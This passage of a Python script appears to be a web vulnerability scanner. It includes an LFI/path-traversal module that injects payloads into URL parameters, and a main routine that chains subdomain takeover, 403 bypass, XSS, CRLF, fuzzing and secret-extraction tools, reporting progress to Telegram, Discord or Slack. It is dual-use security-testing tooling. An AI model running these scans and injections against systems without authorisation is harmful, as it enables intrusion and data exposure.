                                                status_forcelist=(500, 502, 503, 504)))
        session.mount("https://", adapter)
        session.mount("http://", adapter)
        self.session = session

    # ------------------------------------------------------------------
    def _inject(self, url: str, payload: str) -> str | None:
        """Replace every parameter value in *url* with *payload* and return
        the first URL variant that triggers a success signature, or None."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return None

        for key in qs:
            new_qs = dict(qs)
            new_qs[key] = [payload]
            injected = urlunparse(parsed._replace(query=urlencode(new_qs, doseq=True)))
            try:
                resp = self.session.get(
                    injected,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True,
                    headers={"User-Agent": "Mozilla/5.0 (FalconHunter LFIScanner)"},
                )
                body = resp.content
                if any(sig in body for sig in self.SUCCESS_SIGNATURES):
                    return injected
            except Exception:
                pass
        return None

    # ------------------------------------------------------------------
    def _test_url(self, url: str) -> list[str]:
        hits: list[str] = []
        for payload in self.PAYLOADS:
            hit = self._inject(url, payload)
            if hit:
                hits.append(hit)
                break  # one confirmed hit per URL is enough
        return hits

    # ------------------------------------------------------------------
    def scan(self):
        if not os.path.isfile(self.lfi_urls):
            logger.warning(
                f"{color.RED}(-) LFI scanner: {self.lfi_urls} not found — "
                f"run URL collection first{color.END}"
            )
            return

        with open(self.lfi_urls, "r", encoding="utf-8", errors="replace") as fh:
            urls = [l.strip() for l in fh if l.strip()]

        if not urls:
            logger.info(f"{color.GREEN}(+) LFI scanner: no candidate URLs to test{color.END}")
            return

        logger.info(
            f"{color.BLUE}[*] LFI/Path-Traversal scanner: testing {len(urls)} URL(s) "
            f"with {len(self.PAYLOADS)} payloads each ...{color.END}"
        )

        confirmed: list[str] = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(self._test_url, u): u for u in urls}
            for fut in tqdm(
                concurrent.futures.as_completed(futures),
                total=len(futures),
                desc="LFI scan",
                unit="url",
            ):
                hits = fut.result()
                confirmed.extend(hits)

        os.makedirs(os.path.dirname(self.out_file), exist_ok=True)
        with open(self.out_file, "w", encoding="utf-8") as fh:
            for h in confirmed:
                fh.write(h + "\n")

        if confirmed:
            logger.info(
                f"{color.RED}[!] LFI confirmed: {len(confirmed)} vulnerable URL(s) "
                f"→ {self.out_file}{color.END}"
            )
        else:
            logger.info(f"{color.GREEN}(+) LFI scanner: no vulnerabilities confirmed{color.END}")


class TelegramNotify:
    def __init__(self, telegram_token, telegram_chat_id,
                 discord_webhook="", slack_webhook="",
                 timeout=5, max_retries=3):
        """
        Multi-channel notifier: Telegram, Discord, and Slack.

        Args:
            telegram_token (str): Telegram bot token
            telegram_chat_id (str): Telegram chat ID
            discord_webhook (str): Discord webhook URL (optional)
            slack_webhook (str): Slack webhook URL (optional)
            timeout (int): Request timeout seconds
            max_retries (int): Number of retries for transient errors
        """
        self.token           = telegram_token
        self.chat_id         = telegram_chat_id
        self.discord_webhook = discord_webhook
        self.slack_webhook   = slack_webhook
        self.timeout         = timeout

        # Session with retries to mitigate transient network errors
        self.session = requests.Session()
        retries = Retry(
            total=max_retries,
            backoff_factor=0.5,
            status_forcelist=(429, 500, 502, 503, 504),
            allowed_methods=frozenset(["GET", "POST"]),
        )
        adapter = HTTPAdapter(max_retries=retries)
        self.session.mount("https://", adapter)
        self.session.mount("http://", adapter)

    def notify_telegram(self, token=None, chat_id=None, message=""):
        """Send Telegram notification safely (no exceptions raised to caller)"""
        token   = token   or self.token
        chat_id = chat_id or self.chat_id

        _placeholders = {"your_bot_token", "your_chat_id", "YOUR_BOT_TOKEN", "YOUR_CHAT_ID"}
        if not token or not chat_id or token in _placeholders or chat_id in _placeholders:
            logger.debug("Telegram not configured (placeholder or empty); skipping notification.")
            return

        url     = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}

        try:
            response = self.session.post(url, json=payload, timeout=self.timeout)
            if not response.ok:
                logger.warning(f"Telegram notify failed: {response.status_code} - {response.text}")
        except requests.RequestException as e:
            logger.warning(f"Telegram notify failed (non-fatal): {e}")

    def notify_discord(self, message=""):
        """Send Discord webhook notification"""
        if not self.discord_webhook or self.discord_webhook in ("", "your_discord_webhook"):
            return
        try:
            self.session.post(
                self.discord_webhook,
                json={"content": message},
                timeout=self.timeout,
            )
        except requests.RequestException as e:
            logger.warning(f"Discord notify failed (non-fatal): {e}")

    def notify_slack(self, message=""):
        """Send Slack webhook notification"""
        if not self.slack_webhook or self.slack_webhook in ("", "your_slack_webhook"):
            return
        try:
            self.session.post(
                self.slack_webhook,
                json={"text": message},
                timeout=self.timeout,
            )
        except requests.RequestException as e:
            logger.warning(f"Slack notify failed (non-fatal): {e}")

    def notify(self, token=None, chat_id=None, message=""):
        """Send to all configured channels (Telegram + Discord + Slack)"""
        self.notify_telegram(token, chat_id, message)
        self.notify_discord(message)
        self.notify_slack(message)


class Cleanup:
    """Class to handle cleanup of empty files and directories"""

    def __init__(self, output_file, config):
        """
        Initialize with output directory and config

        Args:
            output_file (str): Path to output directory
            config (dict): Cleanup configuration from YAML
        """
        self.output_file = output_file
        self.config = config.get("cleanup", {})
        self.remove_empty_files = self.config.get("remove_empty_files", True)
        self.remove_empty_dirs = self.config.get("remove_empty_dirs", True)

    @loading_animation(
        f"{color.GREEN}[+] Cleaning up empty files and directories{color.END}"
    )
    def cleanup(self):
        """Remove empty files and directories based on config"""
        try:
            if self.remove_empty_files:
                self._remove_empty_files()
            if self.remove_empty_dirs:
                self._remove_empty_dirs()
            logger.info(f"{color.GREEN}[+] Cleanup completed{color.END}")
        except Exception as e:
            logger.exception(
                f"{color.RED}Error during cleanup: {e}{color.END}")

    def _remove_empty_files(self):
        """Remove all empty files in the output directory"""
        for root, _, files in os.walk(self.output_file):
            for file in files:
                file_path = os.path.join(root, file)
                if os.path.getsize(file_path) == 0:
                    try:
                        os.remove(file_path)
                        logger.debug(f"Removed empty file: {file_path}")
                    except Exception as e:
                        logger.error(f"Failed to remove {file_path}: {e}")

    def _remove_empty_dirs(self):
        """Remove all empty directories in the output directory"""
        for root, dirs, _ in os.walk(self.output_file, topdown=False):
            for dir_name in dirs:
                dir_path = os.path.join(root, dir_name)
                try:
                    if not os.listdir(dir_path):  # Directory is empty
                        os.rmdir(dir_path)
                        logger.debug(f"Removed empty directory: {dir_path}")
                except Exception as e:
                    logger.error(f"Failed to remove {dir_path}: {e}")


def load_config(config_path="config.yaml"):
    """Load configuration from YAML file"""
    try:
        with open(config_path, "r") as f:
            config = yaml.safe_load(f)
            if not isinstance(config, dict):
                raise ValueError("Config file is empty or invalid")
            return config
    except FileNotFoundError:
        logger.warning(
            f"{color.RED}(!) Config file not found, using defaults{color.END}"
        )
        return {
            "telegram": {"token": "", "chat_id": ""},
            "cleanup": {"enabled": True, "remove_empty_files": True, "remove_empty_dirs": True},
        }
    except ValueError as e:
        logger.warning(f"{color.RED}{e}; using defaults{color.END}")
        return {
            "telegram": {"token": "", "chat_id": ""},
            "cleanup": {"enabled": True, "remove_empty_files": True, "remove_empty_dirs": True},
        }
    except Exception as e:
        logger.error(f"{color.RED}Error loading config: {e}{color.END}")
        raise


def check_tools():
    """Check for required and optional CLI tools in PATH. Required: subfinder, httpx, waybackurls, anew. Optional: gau, gf, cnfinder, BadAuth0, mantra, nuclei, subjack, subzy, s3scanner."""
    required = ["subfinder", "httpx", "waybackurls", "anew"]
    optional = ["gau", "gf", "cnfinder", "BadAuth0",
                "mantra", "nuclei", "subzy", "s3scanner", "ffuf",
                "corsy", "crlfuzz", "dirsearch", "bypass-403", "kr",
                "dalfox", "openredirex", "secretfinder", "trufflehog",
                "amass", "dnsx", "waymore",
                "wafw00f", "gowitness", "arjun"]
    # Use find_go_bin so Go tools in ~/go/bin are found even when shadowed by
    # Python shims (e.g. the pip-installed httpx CLI).
    def _found(name):
        p = find_go_bin(name)
        return os.path.isfile(p) if os.path.isabs(p) else bool(shutil.which(p))
    missing_required = [n for n in required if not _found(n)]
    missing_optional = [n for n in optional if not _found(n)]
    if missing_required:
        logger.warning(
            f"{color.RED}(!) Missing required tools (add to PATH): {', '.join(missing_required)}{color.END}"
        )
    if missing_optional:
        logger.info(
            f"{color.SKY_BLUE}(i) Optional tools not in PATH: {', '.join(missing_optional)}{color.END}"
        )
    if not missing_required and not missing_optional:
        logger.info(
            f"{color.GREEN}(+) All checked tools found in PATH{color.END}")
    return len(missing_required) == 0


class ScanState:
    """Checkpoint system for resumable scans."""

    def __init__(self, output_dir: str):
        self._path = os.path.join(output_dir, ".scan_state.json")
        self._state: dict = {}
        self._lock = threading.Lock()
        if os.path.isfile(self._path):
            try:
                with open(self._path, "r", encoding="utf-8") as f:
                    self._state = json.load(f)
                logger.info(f"{color.SKY_BLUE}(i) Resuming scan — {sum(self._state.values())} phase(s) already done{color.END}")
            except Exception:
                self._state = {}

    def is_done(self, phase: str) -> bool:
        return self._state.get(phase, False)

    def mark_done(self, phase: str):
        with self._lock:
            self._state[phase] = True
            try:
                with open(self._path, "w", encoding="utf-8") as f:
                    json.dump(self._state, f, indent=2)
            except Exception as e:
                logger.debug(f"Failed to write scan state: {e}")


def generate_summary(output_file: str, domains: str):
    """Write a summary.json to the output directory with counts per category."""
    summary = {
        "generated_at": date.now().strftime("%Y-%m-%d %H:%M:%S"),
        "domains_file": domains,
    }

    def _count_lines(path):
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as f:
                return sum(1 for l in f if l.strip())
        except Exception:
            return 0

    def _count_json_list(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
                return len(data) if isinstance(data, list) else 0
        except Exception:
            return 0

    summary["subdomains_found"]  = _count_lines(f"{output_file}/hosts/subs.txt")
    summary["alive_hosts"]       = _count_lines(f"{output_file}/hosts/alive-hosts.txt")
    summary["total_urls"]        = _count_lines(f"{output_file}/urls/all-urls.txt")
    summary["js_files"]          = _count_lines(f"{output_file}/urls/js-files.txt")
    summary["leaked_docs"]       = _count_lines(f"{output_file}/urls/leaked-docs.txt")
    summary["subdomain_takeovers"] = _count_json_list(f"{output_file}/vuln/takeovers.json")
    summary["email_vuln_domains"]  = sum(
        1 for r in (json.load(open(f"{output_file}/vuln/missing-dmarc.json")) if
                    os.path.isfile(f"{output_file}/vuln/missing-dmarc.json") else [])
        if isinstance(r, dict) and r.get("status") == "Vulnerable"
    )

    vuln_counts = {}
    for name, path in [
        ("nuclei",        f"{output_file}/vuln/nuclei-output.txt"),
        ("nuclei_dast",   f"{output_file}/vuln/nuclei-dast-output.txt"),
        ("dalfox_xss",    f"{output_file}/vuln/dalfox-xss.txt"),
        ("open_redirects",f"{output_file}/vuln/open-redirects.txt"),
        ("cors",          f"{output_file}/vuln/cors.txt"),
        ("crlf",          f"{output_file}/vuln/crlf.txt"),
        ("secrets",       f"{output_file}/vuln/secrets.txt"),
        ("403_bypass",    f"{output_file}/vuln/403-bypass.txt"),
        ("lfi_urls",      f"{output_file}/vuln/lfi-urls.txt"),
        ("ffuf",          f"{output_file}/vuln/ffuf-output.txt"),
        ("api_endpoints", f"{output_file}/vuln/api-endpoints.txt"),
        ("waf",           f"{output_file}/vuln/waf.txt"),
    ]:
        c = _count_lines(path)
        if c:
            vuln_counts[name] = c
    summary["findings"] = vuln_counts

    out = f"{output_file}/summary.json"
    with open(out, "w", encoding="utf-8") as f:
        json.dump(summary, f, indent=2)

    logger.info(f"{color.GREEN}[+] Summary saved → {out}{color.END}")
    logger.info(
        f"{color.GREEN}    Subs: {summary['subdomains_found']} | "
        f"Alive: {summary['alive_hosts']} | "
        f"URLs: {summary['total_urls']} | "
        f"Takeovers: {summary['subdomain_takeovers']}{color.END}"
    )
    return out


def done():
    print(
        rf"""{color.GREEN}
  ________            _____                     _         ____                        ______                __   __               __      __   _____
 /_  __/ /_  ___     / ___/_________ _____     (_)____   / __ \____  ____  ___       / ____/___  ____  ____/ /  / /   __  _______/ /__   / /  |__  /
  / / / __ \/ _ \    \__ \/ ___/ __ `/ __ \   / / ___/  / / / / __ \/ __ \/ _ \     / / __/ __ \/ __ \/ __  /  / /   / / / / ___/ //_/  / /    /_ <
 / / / / / /  __/   ___/ / /__/ /_/ / / / /  / (__  )  / /_/ / /_/ / / / /  __/    / /_/ / /_/ / /_/ / /_/ /  / /___/ /_/ / /__/ ,<     \ \  ___/ /
/_/ /_/ /_/\___/   /____/\___/\__,_/_/ /_/  /_/____/  /_____/\____/_/ /_/\___(_)   \____/\____/\____/\__,_/  /_____/\__,_/\___/_/|_|     \_\/____/
   {color.END}

"""
    )


def main():
    parser = argparse.ArgumentParser(
        description="Web Application Vulnerability Scanner"
    )
    parser.add_argument(
        "-d", "--domains", help="Path to file containing list of domains"
    )
    parser.add_argument(
        "-s", "--single", metavar="DOMAIN",
        help="Single target domain (written to a temp file; alternative to -d)",
    )
    parser.add_argument("-o", "--output", help="Output directory name")
    parser.add_argument(
        "-c", "--config", default="config.yaml", help="Path to config file"
    )
    parser.add_argument(
        "--all", dest="run_all", action="store_true",
        help="Enable ALL optional modules (nuclei, ffuf, cors, crlf, dirsearch, 403, api, xss, redirect, secrets, waf, screenshot, params, lfi)",
    )
    parser.add_argument(
        "--skip", metavar="MODULES",
        help="Comma-separated list of modules to skip even when --all is set (e.g. --skip ffuf,dirsearch)",
    )
    parser.add_argument(
        "--resume", action="store_true",
        help="Resume an interrupted scan — skip phases already completed in the output directory",
    )
    parser.add_argument(
        "--nuclei",
        action="store_true",
        help="Run Nuclei scans (optional)",
    )
    parser.add_argument(
        "-e", "--email", help="Email to test for auth0 misconfigurations"
    )
    parser.add_argument(
        "--ffuf",
        action="store_true",
        help="Run ffuf directory fuzzing on alive hosts (optional)",
    )
    parser.add_argument(
        "--wordlist",
        help="Path to wordlist for ffuf directory fuzzing",
    )
    parser.add_argument(
        "--cors",
        action="store_true",
        help="Run CORS misconfiguration scan (requires corsy)",
    )
    parser.add_argument(
        "--crlf",
        action="store_true",
        help="Run CRLF injection scan (requires crlfuzz)",
    )
    parser.add_argument(
        "--dirsearch",
        action="store_true",
        help="Run directory discovery with dirsearch (optional)",
    )
    parser.add_argument(
        "--dirsearch-wordlist",
        help="Path to wordlist for dirsearch",
    )
    parser.add_argument(
        "--403",
        dest="bypass_403",
        action="store_true",
        help="Run 403 bypass checks (requires bypass-403)",
    )
    parser.add_argument(
        "--api",
        action="store_true",
        help="Run API endpoint discovery (requires kr or ffuf)",
    )
    parser.add_argument(
        "--api-wordlist",
        help="Path to wordlist for API discovery",
    )
    parser.add_argument(
        "--xss",
        action="store_true",
        help="Test XSS parameters with dalfox (requires dalfox)",
    )
    parser.add_argument(
        "--redirect",
        action="store_true",
        help="Test open redirect parameters with openredirex (requires openredirex)",
    )
    parser.add_argument(
        "--secrets",
        action="store_true",
        help="Extract secrets from JS files with secretfinder + trufflehog",
    )
    parser.add_argument(
        "--waf",
        action="store_true",
        help="Detect WAFs on alive hosts with wafw00f (optional)",
    )
    parser.add_argument(
        "--screenshot",
        action="store_true",
        help="Capture screenshots of alive hosts with gowitness (optional)",
    )
    parser.add_argument(
        "--params",
        action="store_true",
        help="Discover hidden parameters with arjun (optional)",
    )
    parser.add_argument(
        "--lfi",
        action="store_true",
        help="Test LFI/path-traversal payloads on extracted parameter URLs (optional)",
    )
    parser.add_argument(
        "--cleanup-only",
        action="store_true",
        help="Run only the cleanup process on existing output directory",
    )
    parser.add_argument(
        "--check-tools",
        action="store_true",
        help="Check for required/optional CLI tools in PATH and exit (see docs for tool list)",
    )
    args = parser.parse_args()

    print(banner)

    if args.check_tools:
        check_tools()
        return

    # --all: enable every optional module
    skip_set = {m.strip().lower() for m in (args.skip or "").split(",") if m.strip()}
    if args.run_all:
        for attr, mod in [
            ("nuclei",     "nuclei"),
            ("ffuf",       "ffuf"),
            ("cors",       "cors"),
            ("crlf",       "crlf"),
            ("dirsearch",  "dirsearch"),
            ("bypass_403", "403"),
            ("api",        "api"),
            ("xss",        "xss"),
            ("redirect",   "redirect"),
            ("secrets",    "secrets"),
            ("waf",        "waf"),
            ("screenshot", "screenshot"),
            ("params",     "params"),
            ("lfi",        "lfi"),
        ]:
            if mod not in skip_set:
                setattr(args, attr, True)

    # --single: write the single domain to a temp file and use it as domains
    _single_tmp = None
    if args.single and not args.domains:
        _single_tmp = tempfile.NamedTemporaryFile(
            mode="w", suffix=".txt", delete=False, encoding="utf-8")
        _single_tmp.write(args.single.strip() + "\n")
        _single_tmp.close()
        args.domains = _single_tmp.name

    # Load configuration
    config = load_config(args.config)

    # Get Telegram config — env vars take priority over config.yaml values
    telegram_config  = config.get("telegram", {})
    telegram_token   = os.environ.get("TELEGRAM_TOKEN",   "").strip() or telegram_config.get("token",   "")
    telegram_chat_id = os.environ.get("TELEGRAM_CHAT_ID", "").strip() or telegram_config.get("chat_id", "")

    # Create notifier instance (Telegram + optional Discord/Slack)
    discord_webhook = os.environ.get("DISCORD_WEBHOOK_URL", "").strip() or config.get("discord", {}).get("webhook_url", "")
    slack_webhook   = os.environ.get("SLACK_WEBHOOK_URL",   "").strip() or config.get("slack",   {}).get("webhook_url", "")
    notifier = TelegramNotify(
        telegram_token, telegram_chat_id,
        discord_webhook=discord_webhook,
        slack_webhook=slack_webhook,
    )

    # Handle cleanup-only mode
    if args.cleanup_only:
        if not args.output:
            logger.error(
                f"{color.RED}Error: Output directory (-o) must be specified for cleanup{color.END}"
            )
            return

        try:
            # Just run cleanup and exit
            cleaner = Cleanup(args.output, config)
            cleaner.cleanup()
            notifier.notify(
                telegram_token, telegram_chat_id, "(+) Cleanup process completed"
            )
            return
        except Exception as e:
            logger.exception("Failed during cleanup")
            notifier.notify(
                telegram_token, telegram_chat_id, "(-) Cleanup process failed"
            )
            return

    # Validate required arguments for normal scan
    if not args.domains or not args.output:
        logger.error(
            f"{color.RED}Error: Both domains (-d) and output (-o) must be specified for scanning{color.END}"
        )
        return

    domains = args.domains
    output_file = args.output
    pwd = os.getcwd()
    real_time = date.now()
    formatted_time = real_time.strftime("%Y-%m-%d %H:%M:%S")

    # Initialise checkpoint system (creates output dir first if needed)
    os.makedirs(output_file, exist_ok=True)
    state = ScanState(output_file) if args.resume else None

    def _phase(name, fn, *fargs, **fkwargs):
        """Run a phase, skipping it when resuming and it's already done."""
        if state and state.is_done(name):
            logger.info(f"{color.SKY_BLUE}(i) Skipping completed phase: {name}{color.END}")
            return
        fn(*fargs, **fkwargs)
        if state:
            state.mark_done(name)

    notifier.notify(
        telegram_token,
        telegram_chat_id,
        f"(+) Scan for {domains} Started at {formatted_time}\n" f" Path:{pwd}",
    )

    def _run_dirs():
        make_dirs = MakeDirectories(output_file)
        make_dirs.mk_dirs()
        notifier.notify(telegram_token, telegram_chat_id, "(+) Directories created successfully")
        logger.info("Directories created successfully")

    def _run_subdomains():
        subdomains_collector = SubdomainsCollector(domains, output_file)
        subdomains_collector.subfinder_subs()
        subdomains_collector.probe()
        notifier.notify(telegram_token, telegram_chat_id, "(+) Subdomain collection completed")
        logger.info("Subdomain collection completed")

    def _run_email_checks():
        dmarc_finder = DmarcFinder(domains, output_file)
        dmarc_finder.validate_domains()
        dmarc_finder.check_zone_transfer()
        notifier.notify(telegram_token, telegram_chat_id, "(+) Email security + zone transfer check completed")
        logger.info("Email security checks completed")

    def _run_takeovers():
        subdomains_takeover = SubdomainTakeOver(domains, output_file, args.email or "")
        subdomains_takeover.get_cname()
        subdomains_takeover.test_takeover()
        subdomains_takeover.auth0()
        takeovers_json_path = f"{output_file}/vuln/takeovers.json"
        takeover_count = 0
        try:
            if os.path.isfile(takeovers_json_path):
                with open(takeovers_json_path) as _tf:
                    takeover_count = len(json.load(_tf))
        except Exception:
            pass
        msg = (f"[!] {takeover_count} subdomain takeover(s) found!" if takeover_count
               else "(+) Subdomain takeover tests completed — no takeovers found")
        notifier.notify(telegram_token, telegram_chat_id, msg)
        logger.info("Subdomain takeover tests completed")
        return subdomains_takeover

    def _run_buckets():
        bucket_finder = BucketFinder(domains, output_file)
        bucket_finder.buckets_cli()
        notifier.notify(telegram_token, telegram_chat_id, "(+) BucketFinder scan completed")
        return bucket_finder

    def _run_urls(bucket_finder):
        finder = UrlFinder(domains, output_file)
        finder.collect_urls()
        finder.extract_js_files()
        bucket_finder.aws_extractor()
        finder.extract_documents()
        finder.extract_js_data_with_mantra()
        notifier.notify(telegram_token, telegram_chat_id, "(+) URL scan completed")
        logger.info("URL scan completed")

    for phase_name, phase_fn in [
        ("dirs",         _run_dirs),
        ("subdomains",   _run_subdomains),
        ("email",        _run_email_checks),
    ]:
        try:
            _phase(phase_name, phase_fn)
        except Exception:
            logger.exception(f"Failed during phase: {phase_name}")

    # Takeovers + buckets share state so run together
    _bucket_finder = BucketFinder(domains, output_file)
    try:
        _phase("takeovers", _run_takeovers)
    except Exception:
        logger.exception("Failed during takeover tests")

    try:
        _phase("buckets", lambda: _run_buckets())
    except Exception:
        logger.exception("Failed during BucketFinder scan")

    try:
        _phase("urls", lambda: _run_urls(_bucket_finder))
    except Exception:
        logger.exception("Failed during URL scan")
        notifier.notify(telegram_token, telegram_chat_id, "(-) URL scan failed")
    # Optional modules — each wrapped in _phase for resume support
    optional_modules = []

    if args.nuclei:
        def _nuclei():
            n = Nuclei(domains, output_file, config.get("nuclei", {}))
            n.basic_nuclei()
            n.dast_nuclei()
            notifier.notify(telegram_token, telegram_chat_id, "(+) Nuclei scan completed")
        optional_modules.append(("nuclei", _nuclei))

    if args.ffuf:
        def _ffuf():
            fc = config.get("ffuf", {})
            wl = args.wordlist or fc.get("wordlist", "")
            DirFuzzer(output_file, wl, fc.get("threads", 40),
                      fc.get("timeout", 10), fc.get("match_codes", "200,204,301,302,307,401,403")).fuzz()
            notifier.notify(telegram_token, telegram_chat_id, "(+) Directory fuzzing completed")
        optional_modules.append(("ffuf", _ffuf))

    if args.cors:
        def _cors():
            CorsScanner(output_file).scan()
            notifier.notify(telegram_token, telegram_chat_id, "(+) CORS scan completed")
        optional_modules.append(("cors", _cors))

    if args.crlf:
        def _crlf():
            CrlfScanner(output_file).scan()
            notifier.notify(telegram_token, telegram_chat_id, "(+) CRLF scan completed")
        optional_modules.append(("crlf", _crlf))

    if args.dirsearch:
        def _dirsearch():
            dc = config.get("dirsearch", {})
            wl = args.dirsearch_wordlist or dc.get("wordlist", "")
            DirectoryFuzzer(output_file, wl, dc.get("threads", 25),
                            dc.get("extensions", "php,html,js,txt,json,xml,bak,zip")).fuzz()
            notifier.notify(telegram_token, telegram_chat_id, "(+) dirsearch completed")
        optional_modules.append(("dirsearch", _dirsearch))

    if args.bypass_403:
        def _bypass():
            FourOhThreeBypasser(output_file).bypass()
            notifier.notify(telegram_token, telegram_chat_id, "(+) 403 bypass completed")
        optional_modules.append(("bypass_403", _bypass))

    if args.api:
        def _api():
            wl = args.api_wordlist or config.get("api_discovery", {}).get("wordlist", "")
            ApiDiscovery(output_file, wl).discover()
            notifier.notify(telegram_token, telegram_chat_id, "(+) API discovery completed")
        optional_modules.append(("api", _api))

    if args.xss:
        def _xss():
            DalfoxScanner(output_file).scan()
            notifier.notify(telegram_token, telegram_chat_id, "(+) Dalfox XSS scan completed")
        optional_modules.append(("xss", _xss))

    if args.redirect:
        def _redirect():
            OpenRedirectScanner(output_file).scan()
            notifier.notify(telegram_token, telegram_chat_id, "(+) Open redirect scan completed")
        optional_modules.append(("redirect", _redirect))

    if args.secrets:
        def _secrets():
            ss = SecretScanner(output_file)
            ss.secretfinder()
            ss.trufflehog()
            notifier.notify(telegram_token, telegram_chat_id, "(+) Secret scanning completed")
        optional_modules.append(("secrets", _secrets))

    if args.waf:
        def _waf():
            WafDetector(output_file).detect()
            notifier.notify(telegram_token, telegram_chat_id, "(+) WAF detection completed")
        optional_modules.append(("waf", _waf))

    if args.screenshot:
        def _screenshot():
            ScreenshotCapture(output_file).capture()
            notifier.notify(telegram_token, telegram_chat_id, "(+) Screenshots captured")
        optional_modules.append(("screenshot", _screenshot))

    if args.params:
        def _params():
            ParameterDiscovery(output_file).discover()
            notifier.notify(telegram_token, telegram_chat_id, "(+) Parameter discovery completed")
        optional_modules.append(("params", _params))

    if args.lfi:
        def _lfi():
            LFIScanner(output_file).scan()
            notifier.notify(telegram_token, telegram_chat_id, "(+) LFI/path-traversal scan completed")
        optional_modules.append(("lfi", _lfi))

    for mod_name, mod_fn in optional_modules:
        try:
            _phase(mod_name, mod_fn)
        except Exception:
            logger.exception(f"Failed during module: {mod_name}")
            notifier.notify(telegram_token, telegram_chat_id, f"(-) {mod_name} failed")

    try:
        generate_summary(output_file, domains)

        if config.get("cleanup", {}).get("enabled", True):
            Cleanup(output_file, config).cleanup()

        done()
        notifier.notify(
            telegram_token, telegram_chat_id,
            "(+) Web Application Vulnerability Scan Completed",
        )
        logger.info("Web Application Vulnerability Scan Completed")
    except Exception as e:
        logger.exception("Failed during final scan steps")
        notifier.notify(
            telegram_token, telegram_chat_id,
            "(-) Web Application Vulnerability Scan failed to complete",
        )
    finally:
        if _single_tmp and os.path.isfile(_single_tmp):
            os.unlink(_single_tmp)


if __name__ == "__main__":
    main()
